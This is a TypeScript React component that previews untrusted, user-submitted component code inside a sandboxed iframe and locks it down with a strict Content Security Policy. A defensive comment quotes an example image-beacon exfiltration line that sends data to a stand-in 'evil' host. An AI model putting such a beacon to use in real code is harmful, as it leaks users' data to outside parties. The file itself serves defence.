"use client";

import { useMemo } from "react";
import type { Framework } from "@/lib/types";

interface Props {
  framework: Framework;
  html: string;
  css: string;
  js: string;
  height?: number;
  className?: string;
  /** Hintergrund im iframe-Body. "transparent" lässt den Wrapper durchscheinen (Preview-Toggle). */
  bg?: string;
  /** Skaliert zu große Inhalte herunter, damit nichts abgeschnitten wird (Karten-Thumbnails). */
  fit?: boolean;
}

/**
 * Renders untrusted, user-submitted component code inside a hardened iframe.
 *
 * Security model:
 *  - sandbox="allow-scripts" WITHOUT allow-same-origin  → opaque origin:
 *    the code cannot read our DOM, cookies, localStorage or Appwrite session.
 *  - CSP inside the document blocks network exfiltration (connect-src 'none')
 *    and restricts which scripts may load.
 */
export default function SandboxPreview({
  framework,
  html,
  css,
  js,
  height = 260,
  className,
  bg = "#0b0b12",
  fit = false,
}: Props) {
  const srcDoc = useMemo(
    () => buildSrcDoc(framework, html, css, js, bg, fit),
    [framework, html, css, js, bg, fit],
  );

  return (
    <iframe
      title="Vorschau"
      srcDoc={srcDoc}
      sandbox="allow-scripts"
      referrerPolicy="no-referrer"
      loading="lazy"
      className={className}
      style={{ width: "100%", height, border: 0, background: "transparent", display: "block" }}
    />
  );
}

// Skaliert den Inhalt so herunter, dass er komplett in den iframe passt (kein Clipping).
// Läuft IM iframe (kennt daher window.innerHeight) — misst die natürliche Größe und
// wendet eine transform:scale an. Mehrfach getriggert für async gerenderte Inhalte.
const FIT_SCRIPT = `<script>(function(){
  var el=document.getElementById('__fit'); if(!el) return;
  function f(){
    el.style.transform='none';
    var r=el.getBoundingClientRect(), pad=8;
    var s=Math.min(1,(window.innerWidth-pad)/r.width,(window.innerHeight-pad)/r.height);
    if(s>0 && s<1) el.style.transform='scale('+s+')';
  }
  requestAnimationFrame(f); setTimeout(f,120); setTimeout(f,450);
  window.addEventListener('load',f);
  if(window.ResizeObserver){ try{ new ResizeObserver(f).observe(el); }catch(e){} }
})();<\/script>`;

function buildSrcDoc(framework: Framework, html: string, css: string, js: string, bg: string, fit = false): string {
  // Vue/Svelte brauchen einen Compile-Schritt — bis dahin ein sauberer Platzhalter
  // statt roher, kaputt gerenderter Quelltext.
  if (framework === "vue" || framework === "svelte") {
    const label = framework === "vue" ? "Vue" : "Svelte";
    return `<!doctype html><html><head><meta charset="utf-8">
<style>html,body{margin:0;height:100%}body{display:grid;place-items:center;background:${bg};color:#a6a29a;font-family:system-ui,sans-serif;text-align:center;padding:24px;box-sizing:border-box}</style>
</head><body><div><div style="font-size:15px;font-weight:600;color:#a78bfa;margin-bottom:8px">${label}</div>
<div style="font-size:13px;line-height:1.5">Live-Vorschau für ${label} folgt in Kürze.<br>Der Code unten ist voll nutzbar &amp; kopierbar.</div></div></body></html>`;
  }

  const isReact = framework === "react";
  const isTailwind = framework === "tailwind";

  const scriptSrc = [
    "'unsafe-inline'",
    isReact ? "'unsafe-eval' https://cdn.jsdelivr.net" : "",
    isTailwind ? "https://cdn.tailwindcss.com" : "",
  ]
    .filter(Boolean)
    .join(" ");

  const csp = [
    "default-src 'none'",
    // Kein blankes https: bei img/font/style -> verhindert Daten-Exfiltration
    // per Bild-Beacon (new Image().src = "https://evil/?"+data) aus fremdem Code.
    "style-src 'unsafe-inline'",
    "img-src data:",
    "font-src data:",
    `script-src ${scriptSrc}`,
    "connect-src 'none'",
    "base-uri 'none'",
    "form-action 'none'",
  ].join("; ");

  const head = `<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${csp}">
<meta name="viewport" content="width=device-width, initial-scale=1">
${isTailwind ? '<script src="https://cdn.tailwindcss.com"></script>' : ""}
${
  isReact
    ? `<script src="https://cdn.jsdelivr.net/npm/react@18.3.1/umd/react.production.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/react-dom@18.3.1/umd/react-dom.production.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7/babel.min.js"></script>`
    : ""
}
<style>
  html,body{margin:0;height:100%}
  body{display:grid;place-items:center;padding:${fit ? 8 : 24}px;box-sizing:border-box;
       ${fit ? "overflow:hidden;" : ""}background:${bg};color:#fff;font-family:system-ui,sans-serif}
  #__fit{transform-origin:center center}
  ${css}
</style>`;

  if (isReact) {
    const name = detectComponentName(html);
    return `<!doctype html><html><head>${head}</head><body>
${fit ? '<div id="__fit"><div id="root"></div></div>' : '<div id="root"></div>'}
<script type="text/babel" data-presets="react">
${html}
try{ReactDOM.createRoot(document.getElementById('root')).render(<${name} />);}catch(e){document.getElementById('root').textContent=String(e);}
</script>
${fit ? FIT_SCRIPT : ""}
</body></html>`;
  }

  return `<!doctype html><html><head>${head}</head><body>
${fit ? `<div id="__fit">${html}</div>` : html}
${js ? `<script>${js}<\/script>` : ""}
${fit ? FIT_SCRIPT : ""}
</body></html>`;
}

function detectComponentName(code: string): string {
  const def = code.match(/export\s+default\s+function\s+([A-Z][A-Za-z0-9_]*)/);
  if (def) return def[1];
  // letzte deklarierte PascalCase-Komponente (Helfer stehen meist davor)
  const fns = [...code.matchAll(/function\s+([A-Z][A-Za-z0-9_]*)/g)];
  if (fns.length) return fns[fns.length - 1][1];
  const cns = [...code.matchAll(/const\s+([A-Z][A-Za-z0-9_]*)\s*=/g)];
  if (cns.length) return cns[cns.length - 1][1];
  return "App";
}
